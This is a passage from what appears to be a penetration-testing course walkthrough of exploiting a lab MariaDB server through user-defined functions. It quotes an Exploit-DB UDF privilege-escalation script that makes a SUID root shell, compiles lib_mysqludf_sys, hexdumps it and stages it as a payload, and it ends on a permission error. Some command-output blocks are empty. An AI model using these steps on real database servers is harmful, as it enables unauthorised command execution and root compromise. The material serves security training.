Now that we are connected, we can look at what privileges we have as the wp user and get a better idea of how this MariaDB instance is configured.

```
MariaDB [(none)]> SHOW Grants;
+------------------------------------------------------------------------------------+
| Grants for wp@%                                                                    |
+------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'wp'@'%' IDENTIFIED BY PASSWORD '*61163AE4B131AB0E43F07BE7B' |
| GRANT SELECT, INSERT, UPDATE, DELETE ON `wordpress`.* TO 'wp'@'%'         |
+------------------------------------------------------------------------------------+
2 rows in set (0.075 sec)
```

We don't have "*" permissions, but SELECT, INSERT, UPDATE, and DELETE are a good starting point. Next, let's take a look at some variables and see if we can find anything that stands out.

```

From this one query we learned a few things. First, we found that the hostname is "zora". From this point on, we will refer to the MariaDB host as Zora. Next, we also learned that the tmp directory is in /var/tmp. We also confirm again that we are running MariaDB version 10.3.20 but we now also learn that the target architecture is _x86_64_. The most interesting piece of information we can gather is that the _plugin_dir_ is set to /home/dev/plugin/. This directory is not standard for MariaDB. Let's take note of that as it might become useful later on.

Now that we have gathered some information, let's see if we can find any exploits for our target MariaDB version.

```

Unfortunately, none of these would work for our version of MariaDB. Let's broaden the scope and see what we get for MySQL.

```

When searching for MySQL vulnerabilities, we have to change our approach a bit. This time we are not looking for an exact version number that might be vulnerable to an exploit since MariaDB and MySQL use different version numbers. Instead, we are trying to see if we can identify a pattern in publicly disclosed exploits that may indicate a type of attack we could use.

We notice that the words "UDF" and "User Defined" show up often. Let's take a look at a more recent UDF exploit found in /usr/share/exploitdb/exploits/linux/local/46249.py.

```
1  # Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit
2  # Date: 24/01/2019
3 ...
19  References:
20  https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
21  https://www.exploit-db.com/exploits/1518
22  https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)
```

The exploit begins by referencing other research into UDF exploitation including a paper written on the subject.

Reviewing this paper teaches us that a User Defined Function (UDF) is similar to a custom plugin for MySQL. It allows database administrators to create custom repeatable functions to accomplish specific objectives. Conveniently for us, UDFs are written in C or C++ and can run almost any code we want, including system commands.

Researchers have discovered how to use standard MySQL (and MariaDB) functionality to create these plugins in ways that can be used to exploit systems. This specific exploit discusses using UDFs as ways to escalate privileges on a host. However, we should be able to use the same principle to get an initial shell. Some modifications will be required but before we start changing anything, let's take a look at the code.

```
40  shellcode_x32 = "7f454c4601010100000000000000000...";
41  shellcode_x64 = "7f454c4602010100000000000000000...";
42
43  shellcode = shellcode_x32
44  if (platform.architecture()[0] == '64bit'):
45   shellcode = shellcode_x64
...
71  cmd='mysql -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
72  plugin_str = subprocess.check_output(cmd, shell=True)
73  plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
74  res = bool(plugin_dir)
...
91  print "Trying to create a udf library...";
92  os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
93  res = os.path.isfile(udf_outfile)
...
99  print "UDF library crated successfully: %s" % udf_outfile;
100  print "Trying to create sys_exec..."
101  os.system('mysql -u root -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)
102
103  print "Checking if sys_exec was crated..."
104  cmd='mysql -u root -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
105  res = subprocess.check_output(cmd, shell=True);
...
110  if res:
111          print "sys_exec was found: %s" % res
112          print "Generating a suid binary in /tmp/sh..."
113          os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
114
115          print "Trying to spawn a root shell..."
116          pty.spawn("/tmp/sh");
```

The first thing we notice is a shellcode variable defined on lines 40-45. The SQL query at line 71 obtains the plugin directory (remember this is the variable that we found was not standard on Zora). Next, on line 92, the code dumps the shellcode binary content into a file within the plugin directory. Line 101 creates a function named _sys_exec_ leveraging the uploaded binary file. Finally, the script checks if the function was successfully created on line 104 and if this is the case, the function is executed on line 113. Reading a bit more about the MySQL _CREATE FUNCTION_ syntax suggests that the binary content of the shellcode variable is supposed to be a shared library that implements and exports the function(s) we want to create within the database.

Essentially, this entire script is only running five commands. If we trim down the code to its essential MySQL commands, we obtain the following:

```
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

Since we already have an interactive MariaDB shell, we could theoretically run these commands directly in the MariaDB shell against Zora. However, we want to make sure we understand what we are about to execute before proceeding.

# Exploitation

### Attempting to Exploit the Database

While the individual commands give us no reason for concern, we have no idea what the shellcode is doing. Instead, we will replace the shellcode with something that we are in control of. The references in the exploit state that raptor_udf.c was used. A quick Google search reveals a relevant Exploit Database entry and a note at the bottom of the comments mentions a GitHub project that looks very promising.

Let's download the code, review it, and compile it.

```
kali@kali:~$ git clone https://github.com/mysqludf/lib_mysqludf_sys.git
Cloning into 'lib_mysqludf_sys'...
...

kali@kali:~$ cd lib_mysqludf_sys/
kali@kali:~/lib_mysqludf_sys$ 
```

Opening up the lib_mysqludf_sys.c file shows us a fairly standard UDF library that allows for execution of system commands through the C/C++ _system_ function.

```
...
my_ulonglong sys_exec(
   UDF_INIT *initid
,  UDF_ARGS *args
,  char *is_null
,  char *error
){
  return system(args->args[0]);
}
...
```

Moreover, according to the code, the function exported by the shared library after compilation is named _sys_exec_ as in the previous exploit. We'll need to create a MySQL function with the same name in order to execute system commands from the database.

Now that we have reviewed the code, we will compile the shared library.

Looking at the install.sh file, as a prerequisite for compilation we need to install _libmysqlclient15-dev_. In Kali Linux, this is the _default-libmysqlclient-dev_ package, which can be installed with apt.

```
kali@kali:~/lib_mysqludf_sys$ sudo apt update && sudo apt install default-libmysqlclient-dev
```

Now that we have the dependencies installed, we need to remove the old object file before generating the new one.

```
kali@kali:~/lib_mysqludf_sys$ rm lib_mysqludf_sys.so 
```

Looking at the Makefile, we will need to make some minor adjustments to ensure we can compile the source file correctly.

```
LIBDIR=/usr/lib

install:
        gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib_mysqludf_sys.so
```

Specifically we need to adjust the include directory path for the gcc command since we have a MariaDB installation on our Kali system and not a MySQL one. The changes to the Makefile are shown in Listing 60.

```
kali@kali:~/lib_mysqludf_sys$ cat Makefile
LIBDIR=/usr/lib                                                                                             
install:                                                                                                
        gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so 
        
kali@kali:~/lib_mysqludf_sys$ make
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
```

The -Wall flag enables all of gcc's warning messages and -I includes the directory of header files. The list included in the command found in Listing 60 are common locations for header files for MariaDB. The -shared flag tells gcc this is a shared library and to generate a shared object file. Finally, -o tells gcc where to output the file.

Recalling the SQL commands from the UDF exploit, to transfer the shared library to the target database server, we will need the file as a hexdump.

```
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

To do so we can use the following command:

```
kali@kali:~/lib_mysqludf_sys$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
```

The xxd command is used to make the hexdump and the -p flag outputs a plain hexdump, which makes it easier for further manipulation. We use tr to delete the new line character and then dump the contents of the output to a file named lib_mysqludf_sys.so.hex.

The contents of the lib_mysqludf_sys.so.hex file is what we will use for shellcode.

We have everything that we need to attempt to exploit Zora. Now we just need to put it together. Before we begin running the malicious SQL commands, we will create a variable in MariaDB for the shellcode. The contents of this variable are obtained from the lib_mysqludf_sys.so.hex file.

```
MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000000;
```

Note the addition of "0x" to the beginning of the shellcode and the lack of single or double quotes. This is necessary for MariaDB to read the text as binary. Next, per the exploit instructions, we will confirm the location of the plugin directory.

```
MariaDB [(none)]> select @@plugin_dir;
+-------------------+
| @@plugin_dir      |
+-------------------+
| /home/dev/plugin/ |
+-------------------+
1 row in set (0.072 sec)
```

As expected, the plugin directory is in /home/dev/plugin/. Next, we need to output the shellcode to a file on Zora. The original exploit generates a random filename for this, but we can name it whatever we want. The command in Listing 65 tells MariaDB to treat the contents of the _@shell_ variable as binary and to output it to the /home/dev/plugin/udf_sys_exec.so file.

```
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
ERROR 1045 (28000): Access denied for user 'wp'@'%' (using password: YES)
MariaDB [(none)]>
```

Unfortunately, this is where we encounter our first problem. According to the error message above, the wp user does not have permissions to create files.
